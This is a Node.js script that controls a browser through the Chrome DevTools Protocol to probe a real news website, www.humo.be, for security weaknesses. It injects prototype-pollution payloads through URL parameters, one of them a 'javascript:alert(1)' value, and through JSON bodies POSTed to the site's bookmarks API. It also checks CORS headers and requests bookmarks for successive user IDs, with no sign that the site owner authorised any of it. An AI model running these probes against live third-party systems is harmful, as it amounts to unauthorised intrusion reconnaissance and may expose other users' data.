// humo_pp_xss.js — comprehensive attack-surface test on www.humo.be (Next.js).
// Tests: Prototype Pollution, CORS, postMessage, Service Worker, innerHTML gadgets.
const http = require('http');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 15000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');

  const evalJS = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', { expression: expr, returnByValue: true });
    return r.result.value;
  };

  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: '(async () => { ' + expr + ' })()',
      awaitPromise: true, returnByValue: true
    });
    return r.result.value;
  };

  // Navigate to Humo
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 6000));

  // === TEST 1: Prototype Pollution baseline ===
  console.log('=== Test 1: Prototype Pollution baseline ===');
  const pp = await evalJS([
    '(function(){',
    '  Object.prototype.titan_test = "polluted";',
    '  var t = {};',
    '  var r1 = t.titan_test === "polluted";',
    '  delete Object.prototype.titan_test;',
    '',
    '  Object.prototype.children = "PP_CHILDREN";',
    '  var el = document.createElement("div");',
    '  var r2 = el.children === "PP_CHILDREN";',
    '  delete Object.prototype.children;',
    '',
    '  return JSON.stringify({basic: r1, children: r2});',
    '})()'
  ].join('\n'));
  console.log('  ' + pp);

  // === TEST 2: URL parameter prototype pollution ===
  console.log('\n=== Test 2: URL parameter PP ===');
  var payloads = [
    '__proto__[children]=PP_TEST',
    'constructor[prototype][children]=PP_TEST',
    '__proto__[innerHTML]=PP_TEST',
    '__proto__[src]=javascript:alert(1)',
  ];
  for (var i = 0; i < payloads.length; i++) {
    var p = payloads[i];
    await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be/?' + p });
    await new Promise(r => setTimeout(r, 3000));
    var check = await evalJS(
      '(function(){ var t = {}; return t.children || t.innerHTML || t.src || "clean"; })()'
    );
    console.log('  ' + p.split('=')[0] + ': ' + check);
  }

  // === TEST 3: JSON body PP via POST ===
  console.log('\n=== Test 3: JSON body PP via POST ===');
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 4000));

  var jsonTests = [
    '{"__proto__":{"children":"PP_POST_TEST"}}',
    '{"constructor":{"prototype":{"children":"PP_POST_TEST"}}}',
  ];
  for (var j = 0; j < jsonTests.length; j++) {
    var body = jsonTests[j];
    var postResult = await evalAsync(
      'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks", {' +
      'method: "POST", headers: {"Content-Type": "application/json"},' +
      'body: "' + body.replace(/"/g, '\\"') + '"});' +
      'return r.status + " | " + (await r.text()).slice(0, 200);'
    );
    var postCheck = await evalJS(
      '(function(){ var t = {}; return t.children || t.innerHTML || "clean"; })()'
    );
    console.log('  POST ' + body.slice(0, 40) + '...: ' + postResult + ' | check: ' + postCheck);
  }

  // === TEST 4: Next.js gadget detection ===
  console.log('\n=== Test 4: Next.js gadgets ===');
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 5000));

  var gadgets = await evalJS([
    '(function(){',
    '  var r = [];',
    '  if (window.__NEXT_DATA__) r.push("__NEXT_DATA__");',
    '  var scripts = document.querySelectorAll("script[src*=\\"_next\\"]");',
    '  r.push(scripts.length + " _next scripts");',
    '  var html = document.documentElement.outerHTML;',
    '  var ih = (html.match(/\\.innerHTML/g) || []).length;',
    '  r.push(ih + " innerHTML refs");',
    '  var dw = (html.match(/document\\.write/g) || []).length;',
    '  r.push(dw + " document.write");',
    '  return r.join("; ");',
    '})()'
  ].join('\n'));
  console.log('  ' + gadgets);

  // === TEST 5: postMessage handlers ===
  console.log('\n=== Test 5: postMessage ===');
  var postMsg = await evalJS([
    '(function(){',
    '  var r = [];',
    '  var html = document.documentElement.outerHTML;',
    '  r.push((html.match(/addEventListener\\s*\\(\\s*["\']message["\']/g) || []).length + " msg listeners");',
    '  r.push((html.match(/onmessage\\s*=/g) || []).length + " onmessage");',
    '  r.push((html.match(/postMessage/g) || []).length + " postMessage calls");',
    '  return r.join("; ");',
    '})()'
  ].join('\n'));
  console.log('  ' + postMsg);

  // === TEST 6: Service Worker ===
  console.log('\n=== Test 6: Service Worker ===');
  var sw = await evalAsync(
    'if (!navigator.serviceWorker) return "not supported";' +
    'var regs = await navigator.serviceWorker.getRegistrations();' +
    'if (regs.length === 0) return "none registered";' +
    'return regs.map(function(r){ return r.scope; }).join(", ");'
  );
  console.log('  ' + sw);

  // === TEST 7: CORS on API ===
  console.log('\n=== Test 7: CORS ===');
  var cors = await evalAsync(
    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=1", {mode:"cors"});' +
    'return "allow-origin: " + r.headers.get("access-control-allow-origin");'
  );
  console.log('  ' + cors);

  // === TEST 8: Rate limiting on bookmarks ===
  console.log('\n=== Test 8: Rate limit (5 rapid requests) ===');
  var rateResults = [];
  for (var k = 0; k < 5; k++) {
    var rr = await evalAsync(
      'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=' + (k+1) + '");' +
      'return r.status;'
    );
    rateResults.push(rr);
  }
  console.log('  statuses: ' + rateResults.join(', '));

  ws.close();
  console.log('\n=== Done ===');
}

main().catch(function(e) { console.error(e); process.exit(1); });
